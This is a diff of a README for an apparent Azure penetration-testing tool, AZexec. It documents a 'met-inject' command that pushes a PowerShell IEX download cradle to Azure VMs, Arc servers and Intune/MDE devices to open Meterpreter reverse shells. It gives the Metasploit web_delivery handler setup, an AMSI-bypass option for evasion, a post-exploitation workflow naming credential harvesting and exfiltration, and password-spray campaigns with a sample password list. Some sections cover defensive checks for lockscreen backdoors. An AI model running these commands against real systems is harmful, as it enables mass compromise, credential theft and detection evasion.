+### Metasploit Injection (`met-inject`)
+
+The `met-inject` command generates a PowerShell download cradle that fetches and executes a Metasploit payload from your handler.
+
+**How It Works:**
+1. Generates a PowerShell download cradle pointing to your Metasploit handler
+2. Deploys the cradle to targets via Azure execution methods
+3. Target executes cradle → downloads payload from Metasploit → Meterpreter connects back
+
+**Parameters:**
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-SRVHOST` | ✅ Yes | Metasploit handler host (IP or hostname) |
+| `-SRVPORT` | ✅ Yes | Metasploit handler port |
+| `-RAND` | ✅ Yes | Random URI path (from web_delivery module) |
+| `-SSL` | No | Use HTTPS for payload download |
+| `-ProxyHost` | No | Proxy host (for environments requiring proxy) |
+| `-ProxyPort` | No | Proxy port |
+| `-AmsiBypass` | No | Path to AMSI bypass script to prepend |
+
+**Usage Examples:**
+
+```powershell
+# Inject Metasploit payload to single VM
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -VMName vm-01
+
+# Inject with SSL (for HTTPS payload delivery)
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 443 -RAND xyz789 -SSL -VMName vm-01
+
+# Inject to all VMs
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllVMs
+
+# Inject to Arc-enabled devices
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllDevices
+
+# Inject through proxy
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ProxyHost proxy.corp.local -ProxyPort 8080 -VMName vm-01
+
+# Inject with AMSI bypass
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AmsiBypass bypass.ps1 -VMName vm-01
+
+# Inject to specific resource group with export
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ResourceGroup "Prod-RG" -AllVMs -ExportPath met-results.csv
+```
+
+**Metasploit Handler Setup:**
+```bash
+# Start Metasploit handler for web_delivery
+msfconsole
+
+use exploit/multi/script/web_delivery
+set target 2                                    # PSH (PowerShell)
+set payload windows/x64/meterpreter/reverse_https
+set SRVHOST 10.10.10.1                         # Your attack machine IP
+set SRVPORT 8080                               # Port for payload delivery
+set LHOST 10.10.10.1                           # Callback IP
+set LPORT 443                                  # Callback port
+set URIPATH abc123                             # This is your -RAND value
+run -j
+
+# Note the generated URL: http://10.10.10.1:8080/abc123
+# Use these values in AZexec:
+# -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123
+```
+
+**Output Format:**
+```
+AZR       vm-web-01             443    Windows     (Meterpreter!)   10.10.10.1:8080
+```
+
+### Generated Cradle
+
+The Metasploit cradle generated by AZexec matches the NetExec implementation:
+
+```powershell
+$ProgressPreference = 'SilentlyContinue'
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}  # If -SSL
+$wc = New-Object System.Net.WebClient
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+IEX $wc.DownloadString('http://10.10.10.1:8080/abc123')
+```
+
+### Execution Methods
+
+Both `empire-exec` and `met-inject` support the same execution methods as the `exec` command:
+
+| Method | Target Type | Description |
+|--------|-------------|-------------|
+| **vmrun** (default) | Azure VMs | Uses Azure VM Run Command (synchronous) |
+| **arc** | Arc-enabled servers | Uses Azure Arc Run Command (synchronous) |
+| **mde** | MDE-enrolled devices | Uses MDE Live Response (async with polling) |
+| **intune** | Intune-managed devices | Uses Intune Proactive Remediation (async) |
+| **automation** | Automation Hybrid Workers | Uses Azure Automation runbooks (job-based) |
+| **auto** | All | Auto-detects best method: vmrun → arc → mde → intune |
+
+> **Note**: All methods require **Windows** targets since Empire and Metasploit payloads are PowerShell-based. Non-Windows devices are automatically skipped with an informational message.
+
+**Targeting Options:**
+
+| Parameter | Description |
+|-----------|-------------|
+| `-VMName` | Single Azure VM by name |
+| `-AllVMs` | All Azure VMs (with optional `-ResourceGroup` filter) |
+| `-DeviceName` | Single Arc-enabled device by name (also searches MDE/Intune) |
+| `-AllDevices` | All Arc-enabled devices |
+| `-ResourceGroup` | Filter targets by resource group |
+| `-SubscriptionId` | Target specific subscription |
+| `-ExecMethod` | Force specific execution method (auto, vmrun, arc, mde, intune, automation) |
+
+**MDE/Intune/Automation Examples:**
+
+```powershell
+# Deploy Empire stager via MDE Live Response
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -DeviceName "LAPTOP-001" -ExecMethod mde
+
+# Deploy Metasploit payload via Intune
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc -DeviceName "DESKTOP-002" -ExecMethod intune
+
+# Auto-detect best method (tries vmrun → arc → mde → intune)
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -DeviceName "TARGET-PC"
+```
+
+### Required Permissions
+
+Same as the `exec` command:
+
+| Method | Required RBAC Roles / API Permissions |
+|--------|---------------------|
+| **vmrun** | Virtual Machine Contributor or Reader + Virtual Machine Command Executor |
+| **arc** | Azure Connected Machine Resource Administrator |
+| **mde** | Machine.LiveResponse, Machine.Read.All (MDE Security API) |
+| **intune** | DeviceManagementManagedDevices.PrivilegedOperations.All (Microsoft Graph) |
+| **automation** | Automation Contributor role
+
+### Attack Workflow
+
+**Phase 1: Reconnaissance**
+```powershell
+# Enumerate all VMs
+.\azx.ps1 hosts
+
+# Check which VMs are running Windows (Empire/Metasploit targets)
+.\azx.ps1 vm-loggedon -VMFilter running
+```
+
+**Phase 2: Deploy Shells**
+```powershell
+# Option A: Empire (full C2 capabilities)
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -AllVMs
+
+# Option B: Metasploit (Meterpreter)
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -AllVMs
+```
+
+**Phase 3: Post-Exploitation**
+```powershell
+# Use Empire/Metasploit for:
+# - Credential harvesting
+# - Lateral movement
+# - Persistence
+# - Data exfiltration
+```
+
+### Security Considerations
+
+1. **Windows Only**: Both commands target Windows systems (PowerShell-based payloads)
+2. **Network Connectivity**: Targets must be able to reach your C2 server
+3. **AMSI**: Consider using `-AmsiBypass` for evasion
+4. **Logging**: All Azure execution methods are logged in Azure Activity Logs
+5. **Firewall**: Ensure C2 ports are accessible from target network
+
+### Technical Comparison
+
+| Aspect | On-Premises (NetExec) | Azure (AZexec) |
+|--------|----------------------|----------------|
+| **Delivery** | SMB/WMI | VM Run Command, Arc, MDE Live Response, Intune, Automation |
+| **Authentication** | NTLM/Kerberos | Azure AD / Entra ID OAuth2 |
+| **Payload Type** | PowerShell cradle | PowerShell cradle |
+| **Target Discovery** | Network scan | Azure RM API, MDE API, Microsoft Graph |
+| **Execution Context** | User/Admin | SYSTEM (Azure/MDE/Intune default) |
+| **Logging** | Windows Event Logs | Azure Activity Logs, MDE Timeline, Intune Logs |
+
 ---
 
 ## 🎯 Features
@@ -1286,12 +2473,17 @@ All ARM commands share a common multi-subscription enumeration pattern:
   - Export valid usernames for password spray attacks
   - **Enhanced v2.0**: Progress indicators, retry logic, adaptive rate limiting, detailed statistics
 - **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
-  - Test single password against multiple users
-  - Support for username:password file format
+  - **NEW: Dedicated `spray` command** with NetExec-style options
+  - Test single or multiple passwords against user lists
+  - `-ContinueOnSuccess`: Keep spraying after finding valid creds (like `--continue-on-success`)
+  - `-NoBruteforce`: Linear pairing mode (user1:pass1, user2:pass2) (like `--no-bruteforce`)
+  - `-PasswordFile`: Load multiple passwords from file (like `-p @file.txt`)
+  - `-Delay`: Configurable delay between password rounds (OPSEC-safe spraying)
   - Automatic lockout detection and account status reporting
   - MFA detection (valid credentials even if MFA blocks)
   - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
-  - Smart delays to avoid account lockouts
+  - OPSEC warnings display before spray attacks
+  - HTML report export with styled dark theme
 - **Domain User Enumeration**: Comprehensive authenticated user enumeration (mimics `nxc smb/ldap <target> -u <user> -p <pass> --users`)
   - **Azure equivalent of NetExec's SMB/LDAP user enumeration**
   - Enumerate all users in Azure/Entra ID directory with full details
@@ -1435,6 +2627,36 @@ All ARM commands share a common multi-subscription enumeration pattern:
   - **Windows-specific filtering** - MDE/BitLocker recommendations only for Windows devices
   - Color-coded output: Green (secure), Yellow (warnings), Red (critical gaps)
   - Export detailed security reports to CSV, JSON, or HTML
+- **Remote Command Execution**: Execute remote commands on Azure VMs, Arc-enabled servers, and managed devices (mimics `nxc smb -x/-X`)
+  - Azure equivalent of NetExec's `-x` (shell) and `-X` (PowerShell) options
+  - **Six execution methods**:
+    - **vmrun**: Azure VM Run Command (synchronous - Azure VMs)
+    - **arc**: Azure Arc Run Command (synchronous - Arc-enabled servers)
+    - **mde**: MDE Live Response (async with polling - MDE-enrolled devices)
+    - **intune**: Intune Proactive Remediation (async - Intune-managed devices)
+    - **automation**: Azure Automation Hybrid Worker (job-based - Automation-configured servers)
+    - **auto**: Automatic method detection with failover (Arc → MDE → Intune)
+  - **VM Targeting**: `-VMName` for single VM, `-AllVMs` for all VMs
+  - **Device Targeting**: `-DeviceName` for single device, `-AllDevices` for all Arc-enabled devices
+  - Auto-detection of target type with intelligent failover between methods
+  - Support for both Windows and Linux targets
+  - "(Exec3d!)" indicator on successful execution (Azure equivalent of "(Pwn3d!)")
+  - Command timeout configuration
+  - Multi-subscription support with automatic enumeration
+  - Export execution results to CSV, JSON, or HTML
+- **Shell Generation (Empire & Metasploit)**: Deploy C2 payloads via Azure execution methods (mimics `nxc -M empire_exec` and `nxc -M met_inject`)
+  - **Empire Execution** (`empire-exec`): Connect to Empire REST API, generate stagers, deploy to Azure targets
+    - Supports listener selection, obfuscation options, and SSL
+    - Config file support for Empire credentials
+    - "(Empire!)" indicator on successful deployment
+  - **Metasploit Injection** (`met-inject`): Generate PowerShell cradles, deploy via Azure execution
+    - Supports web_delivery module integration
+    - SSL and proxy configuration for payload delivery
+    - "(Meterpreter!)" indicator on successful deployment
+  - Both commands support all Azure targeting options (VM, Arc, ResourceGroup, AllVMs, AllDevices)
+  - AMSI bypass integration for evasion
+  - Multi-subscription support
+  - Export deployment results to CSV, JSON, or HTML
 - **Netexec-Style Output**: Familiar output format for penetration testers and security professionals
 - **Advanced Filtering**: Filter devices by OS, trust type, compliance status, and more
 - **Owner Information**: Optional device owner enumeration with additional API calls
@@ -1482,7 +2704,7 @@ All commands follow this consistent color hierarchy:
 
 **Example output:**
 ```powershell
-AZR         d1f5c8a3b7e...  443    Contoso-Admin-App            [*] (appId:...) (appRoles:5) (delegated:2)  # RED
+AZR         d1f5c8a3b7e...  443    Example-Admin-App            [*] (appId:...) (appRoles:5) (delegated:2)  # RED
     [+] Application Permissions (App Roles):
         [-] Microsoft Graph : RoleManagement.ReadWrite.Directory (ID: ...)  # RED
         [-] Microsoft Graph : User.Read.All (ID: ...)  # Normal color
@@ -1598,12 +2820,12 @@ AZR         def456...       443    Marketing Team               [*] (security:Tr
 
 If you prefer plain text output (for scripting or logging), colors respect PowerShell's output stream configuration and can be redirected normally. Exported files (CSV/JSON) contain data without color codes.
 
-## 📚 Additional Documentation
+## 📚 Related Documentation
 
 - **[Complete Password Spray Attack Guide](PASSWORD-SPRAY.md)** - Comprehensive documentation for GetCredentialType enumeration + ROPC password spraying
 - **[Notes & Roadmap](notes.md)** - Planned features and implementation status
 
-## 📋 Requirements
+## 📋 Prerequisites & Permissions Matrix
 
 - **PowerShell 7+** (PowerShell Core)
 - **Internet Connection**: Required for API access
@@ -1741,7 +2963,7 @@ If you prefer plain text output (for scripting or logging), colors respect Power
 - Displays session controls and risk-based conditions
 - Provides security recommendations and highlights high-risk policies
 
-## 🚀 Installation
+## 🚀 Quick Start Setup
 
 1. **Clone the repository**:
 ```bash
@@ -1759,7 +2981,7 @@ $PSVersionTable.PSVersion
 .\azx.ps1 hosts
 ```
 
-## 🗂️ Project Structure
+## 🗂️ Codebase Architecture & Command Mapping
 
 AZexec follows a modular architecture where functionality is organized into separate files:
 
@@ -1831,10 +3053,13 @@ The following commands use Azure Resource Manager API (Az PowerShell modules) in
 | `disks-enum` | Enumerate Azure Managed Disks (mimics nxc --disks) | Az.Accounts, Az.Resources, Az.Compute | Reader (Disk Reader or Contributor for full details) |
 | `bitlocker-enum` | Enumerate BitLocker encryption status on Intune devices + Azure VMs (mimics nxc -M bitlocker) | Microsoft.Graph (Intune) + Az.Accounts, Az.Compute, Az.Resources (VMs) | DeviceManagementManagedDevices.Read.All (Intune) + VM Contributor (Azure VMs) |
 | `process-enum` | Enumerate remote processes on Azure VMs (mimics nxc smb --tasklist) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
+| `lockscreen-enum` | Detect lockscreen backdoors on Azure VMs (mimics nxc smb -M lockscreendoors) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
+| `intune-enum` | Enumerate Intune/Endpoint Manager configuration (mimics nxc smb -M sccm-recon6) | Microsoft.Graph | DeviceManagementConfiguration.Read.All, DeviceManagementRBAC.Read.All, DeviceManagementManagedDevices.Read.All |
+| `delegation-enum` | Enumerate OAuth2 delegation/impersonation paths (mimics nxc smb --delegate) | Microsoft.Graph | Application.Read.All, Directory.Read.All |
 
 **Multi-Subscription Support**: All ARM commands automatically enumerate all accessible subscriptions. Use `-SubscriptionId` to target a specific subscription, or `-ResourceGroup` to filter within subscriptions.
 
-## 🧪 Testing
+## 🧪 Automated Test Suite
 
 AZexec includes an automated test suite to verify all commands execute without parameter errors.
 
@@ -1924,7 +3149,7 @@ All commands executed successfully!
 
 **Note**: The test suite verifies command structure and execution, not functional correctness. It ensures the tool doesn't have breaking changes after structural modifications.
 
-## 📖 Usage
+## 📖 Command Syntax & Attack Workflows
 
 ### Quick Reference: Attack Scenarios
 
@@ -2237,7 +3462,7 @@ Get-Content spray-results.json | ConvertFrom-Json | Select -ExpandProperty AuthR
 - `noncompliant` - Only non-compliant devices
 - `disabled` - Only disabled devices
 
-## 💡 Usage Examples
+## 💡 Command Examples by Feature
 
 ### Getting Help
 
@@ -2387,13 +3612,13 @@ Discover tenant configuration for a specific domain:
 ### Example 11: Tenant Discovery with Export
 Discover tenant configuration and export to JSON:
 ```powershell
-.\azx.ps1 tenant -Domain contoso.onmicrosoft.com -ExportPath tenant-info.json
+.\azx.ps1 tenant -Domain example.onmicrosoft.com -ExportPath tenant-info.json
 ```
 
 ### Example 12: Tenant Discovery for Multiple Domains
 Discover configuration for multiple domains:
 ```powershell
-@("example.com", "contoso.com", "fabrikam.onmicrosoft.com") | ForEach-Object { 
+@("example.com", "example.com", "fabrikam.onmicrosoft.com") | ForEach-Object { 
     .\azx.ps1 tenant -Domain $_ 
 }
 ```
@@ -2987,46 +4212,47 @@ $validExecs | Out-File -FilePath valid-executives.txt
 ```
 
 ### Example 28p: Multi-Password Spray Campaign
-Testing multiple passwords sequentially (with delays to avoid lockouts):
+Testing multiple passwords with built-in delay between rounds (NetExec-style):
 ```powershell
+# Create a password file (one password per line)
+@'
+Summer2024!
+Winter2024!
+Spring2024!
+Fall2024!
+Password123!
+Welcome123!
+TargetCorp2024!
+'@ | Out-File passwords.txt
+
 # Validate usernames first
 .\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
-$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
-$validUsers | Out-File spray-targets.txt
+Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username | Out-File spray-targets.txt
 
-# Password list (seasonal passwords + common patterns)
-$passwords = @(
-    'Summer2024!',
-    'Winter2024!',
-    'Spring2024!',
-    'Fall2024!',
-    'Password123!',
-    'Welcome123!',
-    'TargetCorp2024!'
-)
+# NEW: Use the spray command with built-in delay (30 minutes between password rounds)
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-results.json
 
-# Spray each password with 30-minute delay between rounds
+# Or continue even after finding valid creds
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-all.json
+
+# Export to HTML for reporting
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-report.html
+```
+
+**Legacy Method (Manual Loop):**
+```powershell
+# If you prefer the old manual method with more control:
+$passwords = @('Summer2024!', 'Winter2024!', 'Password123!')
+
 foreach ($password in $passwords) {
     Write-Host "`n[*] Testing password: $password"
     .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
-    
-    # Wait 30 minutes before next password (avoid account lockouts)
+
     if ($password -ne $passwords[-1]) {
         Write-Host "[*] Waiting 30 minutes before next password spray..."
-        Start-Sleep -Seconds 1800  # 30 minutes
+        Start-Sleep -Seconds 1800
     }
 }
-
-# Consolidate all results
-$allResults = @()
-foreach ($password in $passwords) {
-    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
-    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
-    $allResults += $validCreds
-}
-
-Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
-$allResults | Format-Table Username, Password, MFARequired, HasToken
 ```
 
 ### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
@@ -3615,8 +4841,8 @@ Enumerate BitLocker encryption status on Intune-managed devices AND Azure VMs:
 [*] SECTION 1: INTUNE-MANAGED DEVICES
 [+] Found 12 Windows devices in Intune
 
-AZR  5905c343-84f7-  443  LS-LPT-05  [*] BitLocker ENABLED | Compliance: compliant
-AZR  b15754a0-0a2b-  443  LS-MCD-01  [*] NOT ENCRYPTED | Compliance: noncompliant
+AZR  5905c343-84f7-  443  T-05  [*] BitLocker ENABLED | Compliance: compliant
+AZR  b15754a0-0a2b-  443  D-01  [*] NOT ENCRYPTED | Compliance: noncompliant
 
 [*] Intune Device Summary:
     Total Windows Devices: 12
@@ -3624,7 +4850,7 @@ AZR  b15754a0-0a2b-  443  LS-MCD-01  [*] NOT ENCRYPTED | Compliance: noncomplian
     NOT Encrypted: 1
 
 [!] Devices without BitLocker:
-    → LS-MCD-01
+    → D-01
 ```
 
 ### Example 34-bitlocker-b: Target Specific Subscription
@@ -3801,16 +5027,16 @@ Find devices with disabled antivirus or firewall:
 
 [*] Security Recommendations:
     [!] 4 devices have DISABLED antivirus - HIGH RISK!
-        → gkarpouzas_AndroidForWork_5/19/2025_5:54 AM
-        → Thanasis's MacBook Pro
-        → samsungSM-S908B
-        → DESKTOP-PBLFO5I
+        → AndroidForWork
+        → MacBook Pro
+        → 908B
+        → FO5I
     [!] 1 Windows devices NOT onboarded to Microsoft Defender for Endpoint
-        → DESKTOP-PBLFO5I
+        → LFO5I
         Consider onboarding to MDE for enhanced threat protection
     [!] 2 Windows devices NOT encrypted (BitLocker)
-        → LS-MCD-01
-        → DESKTOP-PBLFO5I
+        → 01
+        → LFO5I
         Enable BitLocker to protect data at rest
 ```
 
@@ -3858,9 +5084,9 @@ nxc smb 192.168.1.0/24 -u administrator -p 'Password1' -M enum_av
 .\azx.ps1 av-enum
 
 # Output example:
-# AZR  7b67c060-eb92-4  443  LS-LPT-06  [*] AV:Microsoft Defender(enabled) v1.443.147.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | Encryption:BitLocker Enabled
-# AZR  5b397631-d32c-4  443  DESKTOP-PBLFO5I  [*] AV:Unknown(disabled) | MDE:Not Onboarded
-# AZR  53d543a0-b709-4  443  Thanasis's MacBook Pro  [*] AV:Unknown(disabled) | MDE:Not Onboarded
+# AZR  60-eb92-4  443  T-06  [*] AV:Microsoft Defender(enabled) v1.443.147.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | Encryption:BitLocker Enabled
+# AZR  31-d32c-4  443  O5I  [*] AV:Unknown(disabled) | MDE:Not Onboarded
+# AZR  a0-b709-4  443  MacBook Pro  [*] AV:Unknown(disabled) | MDE:Not Onboarded
 ```
 
 Both enumerate security products, but AZexec provides additional cloud-native security information:
@@ -4001,6 +5227,392 @@ AZR         web-server-01  443     keepass.exe                      [*] PID:5678
 
 ---
 
+### Lockscreen Backdoor Enumeration: `lockscreen-enum`
+
+The Azure equivalent of NetExec's `-M lockscreendoors` module. Detect when Windows accessibility executables have been replaced with backdoors:
+
+```powershell
+# Detect lockscreen backdoors on all Azure VMs (like nxc smb -M lockscreendoors)
+.\azx.ps1 lockscreen-enum
+
+# Check only running VMs
+.\azx.ps1 lockscreen-enum -VMFilter running
+
+# Target specific subscription or resource group
+.\azx.ps1 lockscreen-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
+.\azx.ps1 lockscreen-enum -ResourceGroup Production-RG
+
+# Export results to file
+.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.csv
+.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.html
+```
+
+**What is a Lockscreen Backdoor?**
+
+Attackers can replace Windows accessibility executables with cmd.exe or powershell.exe to gain SYSTEM access from the lock screen without authentication. These executables can be triggered from the Windows lock screen:
+
+| Executable | Trigger | Description |
+|------------|---------|-------------|
+| `utilman.exe` | Win+U | Ease of Access utility |
+| `sethc.exe` | 5x Shift | Sticky Keys |
+| `narrator.exe` | Win+Enter | Narrator screen reader |
+| `osk.exe` | On-Screen Keyboard button | On-Screen Keyboard |
+| `magnify.exe` | Win++ | Magnifier |
+| `EaseOfAccessDialog.exe` | Ease of Access menu | Ease of Access Dialog |
+| `displayswitch.exe` | Win+P | Display Switch |
+| `atbroker.exe` | Assistive Technology | Assistive Technology Service |
+| `voiceaccess.exe` | Voice commands | Windows Voice Access |
+
+**Detection Logic**:
+- **CLEAN**: FileDescription matches expected accessibility tool name
+- **SUSPICIOUS**: FileDescription differs from expected value (could be legitimate update or modification)
+- **BACKDOORED**: FileDescription is "Windows PowerShell" or "Windows Command Processor" (definite compromise)
+
+**NetExec Comparison**:
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb 192.168.1.0/24 -u admin -p pass -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | Detect accessibility backdoors |
+| NetExec checks via SMB/WMI on remote Windows hosts | AZexec checks via Azure VM Run Command | Cloud vs On-Prem |
+
+**How It Works**:
+- Uses Azure VM Run Command to execute PowerShell on Windows VMs
+- Reads FileDescription metadata from each accessibility executable using `[System.Diagnostics.FileVersionInfo]`
+- Compares against expected descriptions for accessibility tools
+- Flags executables with cmd.exe or PowerShell descriptions as **BACKDOORED**
+- Windows VMs only (Linux VMs are automatically skipped)
+
+**Example Output**:
+```
+[*] AZX - Lockscreen Backdoor Enumeration
+[*] Command: lockscreen-enum (Similar to: nxc smb -M lockscreendoors)
+[*] Azure equivalent of NetExec's lockscreendoors module
+
+[*] VM: web-server-01
+    Resource Group: Production-RG
+    OS Type: Windows
+    Power State: running
+    [*] Checking accessibility executables...
+AZR         web-server-01  443     utilman.exe                        [+] CLEAN (desc:Utility Manager)
+AZR         web-server-01  443     narrator.exe                       [+] CLEAN (desc:Screen Reader)
+AZR         web-server-01  443     sethc.exe                          [!] BACKDOORED (desc:Windows Command Processor)
+AZR         web-server-01  443     osk.exe                            [+] CLEAN (desc:Accessibility On-Screen Keyboard)
+    [!!!] CRITICAL: 1 BACKDOORED executable(s) detected!
+
+[*] LOCKSCREEN ENUMERATION SUMMARY
+    Total VMs Found: 5
+    Windows VMs Queried: 4
+    Successful Queries: 4
+    BACKDOORED: 1
+    SUSPICIOUS: 0
+    CLEAN: 35
+```
+
+**Use Cases**:
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Incident Response** | Detect persistence mechanisms | `.\azx.ps1 lockscreen-enum -VMFilter running` |
+| **Security Audit** | Check all VMs for accessibility backdoors | `.\azx.ps1 lockscreen-enum -ExportPath audit.html` |
+| **Compromise Assessment** | Identify potentially compromised systems | `.\azx.ps1 lockscreen-enum -ResourceGroup critical-systems` |
+| **Red Team Validation** | Verify detection capabilities | Check if implanted backdoors are detected |
+
+**Attack Context**:
+1. Attacker gains access to system (e.g., via RDP, physical access, or admin credentials)
+2. Copies cmd.exe to C:\Windows\System32\sethc.exe (or other accessibility executable)
+3. At lock screen, presses Shift 5 times (for sethc.exe) or Win+U (for utilman.exe)
+4. Instead of accessibility feature, a SYSTEM command prompt appears
+5. Attacker has unauthenticated SYSTEM access
+
+**Troubleshooting**:
+- **"VM is not in running state"**: Lockscreen enumeration only works on running VMs. Use `-VMFilter running` to skip stopped VMs.
+- **"AuthorizationFailed"**: Ensure you have `Virtual Machine Contributor` or `VM Command Executor` role assigned.
+- **"Skipping - Lockscreen enumeration is Windows-only"**: Linux VMs don't have Windows accessibility features and are automatically skipped.
+- **"NOT FOUND"**: Some executables may not exist on all Windows versions (e.g., voiceaccess.exe is Windows 11+ only).
+
+---
+
+### Intune/Endpoint Manager Enumeration: `intune-enum`
+
+The Azure equivalent of NetExec's `-M sccm-recon6` module. Enumerate Microsoft Intune/Endpoint Manager infrastructure configuration:
+
+```powershell
+# Enumerate Intune configuration (like nxc smb -M sccm-recon6)
+.\azx.ps1 intune-enum
+
+# Export results to file
+.\azx.ps1 intune-enum -ExportPath intune-report.csv
+.\azx.ps1 intune-enum -ExportPath intune-report.json
+.\azx.ps1 intune-enum -ExportPath intune-report.html
+```
+
+**What is SCCM vs Intune?**
+
+SCCM (System Center Configuration Manager) is Microsoft's on-premises endpoint management solution. In Azure/cloud environments, SCCM has been replaced by **Microsoft Intune** (part of Microsoft Endpoint Manager). This command provides the cloud equivalent of SCCM reconnaissance.
+
+**NetExec sccm-recon6 vs AZexec intune-enum:**
+
+| Aspect | On-Premises (NetExec sccm-recon6) | Azure (AZexec intune-enum) |
+|--------|-----------------------------------|----------------------------|
+| **Command** | `nxc smb <target> -u User -p Pass -M sccm-recon6` | `.\azx.ps1 intune-enum` |
+| **Protocol** | SMB/Registry (port 445) | Microsoft Graph API (HTTPS/443) |
+| **Target** | SCCM Primary Site Server | Microsoft Intune tenant |
+| **Data Source** | `HKLM\SOFTWARE\Microsoft\SMS` registry | Graph `/deviceManagement/*` endpoints |
+| **Infrastructure** | Distribution Points, Management Points | Enrollment configs, Compliance policies |
+| **Role Info** | Site server roles | Intune RBAC role definitions & assignments |
+| **Deployment** | PXE boot, Task Sequences | Autopilot profiles, Configuration profiles |
+
+**What intune-enum Enumerates:**
+
+| Category | SCCM Equivalent | Description |
+|----------|-----------------|-------------|
+| **Enrollment Configurations** | Distribution Points | Device enrollment limits, platform restrictions |
+| **Compliance Policies** | Management Point security policies | Required security settings per platform |
+| **Configuration Profiles** | Task Sequences | WiFi, VPN, certificates, custom configs |
+| **RBAC Role Definitions** | Site Admin Roles | Built-in and custom Intune admin roles |
+| **Role Assignments** | Role Memberships | Who has what Intune permissions |
+| **Autopilot Profiles** | PXE Boot / OS Deployment | Windows device provisioning settings |
+| **Managed Device Summary** | Site Status | Total enrolled devices by platform |
+
+**Required Permissions:**
+
+```
+DeviceManagementConfiguration.Read.All  - Read device configurations and policies
+DeviceManagementRBAC.Read.All           - Read Intune role assignments
+DeviceManagementManagedDevices.Read.All - Read managed device info
+```
+
+**Example Output:**
+```
+[*] AZX - Intune/Endpoint Manager Enumeration
+[*] Command: intune-enum (Similar to: nxc smb -M sccm-recon6)
+[*] Azure equivalent of NetExec's SCCM reconnaissance
+
+[*] ========================================
+[*] ENROLLMENT CONFIGURATION
+[*] ========================================
+
+AZR         INTUNE          443    Windows Enrollment                 [*] Type: Enrollment Limit | Limit: 15 devices
+AZR         INTUNE          443    iOS Enrollment                     [*] Type: Platform Restrictions
+AZR         INTUNE          443    Android Enrollment                 [!] HIGH LIMIT - Type: Enrollment Limit | Limit: 50 devices
+
+[*] ========================================
+[*] COMPLIANCE POLICIES
+[*] ========================================
+
+AZR         INTUNE          443    Windows-Security-Baseline          [*] Platform: Windows 10/11 | BitLocker:Required | Firewall:Required
+AZR         INTUNE          443    iOS-Corporate-Policy               [*] Platform: iOS/iPadOS | Password:Required | MinLen:6
+AZR         INTUNE          443    Android-Basic-Policy               [!] NO SECURITY REQUIREMENTS - Platform: Android
+
+[*] ========================================
+[*] INTUNE RBAC ROLES
+[*] ========================================
+
+AZR         INTUNE          443    Intune Administrator               [!] HIGH PRIV - Full Intune access
+AZR         INTUNE          443    Help Desk Operator                 [*] Built-in | Permissions: 45
+AZR         INTUNE          443    Custom Device Admin                [*] Custom | Permissions: 23
+
+[*] ========================================
+[*] CONFIGURATION PROFILES
+[*] ========================================
+
+AZR         INTUNE          443    Corporate-WiFi                     [!] SENSITIVE - WiFi
+AZR         INTUNE          443    VPN-AlwaysOn                       [!] SENSITIVE - VPN
+AZR         INTUNE          443    Certificate-SCEP                   [!] SENSITIVE - Certificate
+AZR         INTUNE          443    Windows-Baseline                   [*] Type: Windows General
+
+[*] ========================================
+[*] AUTOPILOT PROFILES
+[*] ========================================
+
+AZR         INTUNE          443    Standard-Deployment                [*] Mode: User-Driven | OOBE: SkipEULA | SkipPrivacy
+AZR         INTUNE          443    Kiosk-Deployment                   [!] LOCAL ADMIN - Mode: Self-Deploying | OOBE: LocalAdmin
+
+[*] ========================================
+[*] MANAGED DEVICES SUMMARY
+[*] ========================================
+
+    Total Enrolled Devices: 1,234
